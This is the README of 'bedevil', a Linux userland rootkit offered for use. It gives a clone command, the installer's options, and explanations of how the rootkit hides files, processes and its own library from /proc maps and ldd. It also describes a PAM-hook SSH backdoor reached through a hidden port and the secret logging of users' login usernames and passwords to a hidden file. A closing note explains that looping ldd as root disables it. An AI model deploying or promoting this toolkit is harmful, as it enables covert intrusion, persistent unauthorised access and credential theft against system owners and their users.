# bedevil

###### Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
<i>bedevil is designed to be more robust, faster and efficient than vlany.</i>
<hr>

### Aim of bedevil</br>
Ultimately my core aim is to tidy up the project (previously vlany), fix outstanding issues and organise previous</br>
chaos into a more manageable system. This makes it heaps easier on me when it comes to managing</br>
the rootkit.</br>
I also made an effort to minimalise the amount of dependencies required to install the kit</br>
on a machine.</br>
<hr>

### Mandatory 'module' files
 * [__std_includes__](https://github.com/naworkcaj/bdvl/blob/master/modules/std_includes): list of standard headers to include for the shared library</br>
 * [__module_includes__](https://github.com/naworkcaj/bdvl/blob/master/modules/module_includes): list of custom headers to include</br>
 * [__lib_hooks__](https://github.com/naworkcaj/bdvl/blob/master/modules/lib_hooks): a list of library symbols to hook, along with their respective library names</br>
 * [__stconsts__](https://github.com/naworkcaj/bdvl/blob/master/modules/stconsts): 'static' background consts that the user doesn't really need to see</br>
 * [__prehook.c__](https://github.com/naworkcaj/bdvl/blob/master/modules/prehook.c): a file containing the constructor and destructor code for the shared library
<hr>

### bedevil.sh
`git clone https://github.com/naworkcaj/bdvl.git && cd bdvl/`
```
$ ./bedevil.sh -h

 /$$                       /$$                      /$$ /$$
| $$                      | $$                     |__/| $$
| $$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$  /$$    /$$ /$$| $$
| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$|  $$  /$$/| $$| $$
| $$  \ $$| $$$$$$$$| $$  | $$| $$$$$$$$ \  $$/$$/ | $$| $$
| $$  | $$| $$_____/| $$  | $$| $$_____/  \  $$$/  | $$| $$
| $$$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$   \  $/   | $$| $$
|_______/  \_______/ \_______/ \_______/    \_/    |__/|__/




Usage: ./bedevil.sh [ -h | -v | -d | -f | -D | -c | -C | -i]
        -h: Show this help message and exit.
        -v: Toggle verbose output.
        -d: Populate rootkit headers with user data.
        -f: Toggle use of preconfigured settings file.
            You will be prompted for a file location during
            installation. This can be a local url or via http.
        -D: Install all potential required dependencies.
        -c: Make gxqB2LRtGkbh.so in current directory and exit.
            bdvl.c and awesome_modules must be present.
        -C: Clean up installation/compilation mess and exit.
        -i: Launch full installation of bedevil. You will be
            prompted for input when needed.


```
###### *Compile only (no installation):* `./bedevil.sh -dbc` (will compile the .so in the your cwd)</br>
<b>P.S.:</b></br>The 'preconfigured settings file' is a way of transferring your</br>
previous settings without having to retype them out and whatnot.</br>
This doesn't actually work right now, so you may as well ignore it.
<hr>

#### File/process hiding:
Processes and files are hidden using magic GIDs. Although the magic GID method is somewhat</br>
deprecated, it remains the fastest and the most simple. Not that it's bad, but people are highly</br>
aware of it now.</br>

#### Library presence hiding
bedevil hides itself from any process map files. Reading /proc/$$/maps, /proc/$$/smaps, or</br>
/proc/$$/numa_maps when the kit is installed will make it seem apparent that there are no other</br>
potentially malicious libraries being loaded into userspace.</br>
</br>
Calling `ldd` on any dynamic binaries will not immediately reveal the location of the rootkit's</br>
shared library. Calling `ldd` as a regular user will throw a read/write error, and calling `ldd` as</br>
root user will grant us sufficient permissions to quickly uninstall and reinstall the rootkit after</br>
showing a 'clean' ldd output to the root user. Further fogging the location of the rootkit's library.

#### Backdoor
bedevil uses PAM hooks as a backdoor to allow said user access to the machine</br>
over ssh, should they know the backdoor username and password. You setup</br>
access to this backdoor during installation, and I recommend connecting with</br>
your hidden port so that you are hidden from netstat and the likes.</br>
You can use [etc/ssh.sh](https://github.com/naworkcaj/bdvl/blob/master/etc/ssh.sh) to connect
to the PAM backdoor.</br>
bedevil's PAM hooks also log authenticated user credentials whenever they log into</br>
their accounts. Credentials (username & password) are logged in your hidden directory</br>
in a file called 'auth_logs'. vlany had this same ability. I intend to build upon it.</br>
</br>
Upon connecting to the backdoor, you'll be shown information that may prove useful.</br>
[etc/eutils.sh](https://github.com/naworkcaj/bdvl/blob/master/etc/eutils.sh) is a small script which utilises my addition to the [execve hook](https://github.com/naworkcaj/bdvl/blob/master/modules/exec/execve.c), allowing you</br>
to hide & unhide files safely and on-the-fly, while logged in as a backdoor user.

#### Notes
 * Through suppressing obvious rootkit presence information, there is a massive vulnerability in bedevil and vlany.</br>By running something like `while true; do ldd /bin/echo; done` (as root) you have effectively removed</br>the evil rootkit functionality from the machine. This is because bedevil and vlany essentially uninstall</br>themselves temporarily while i.e. ldd is running. This isn't an issue unless said person is aware of the installation.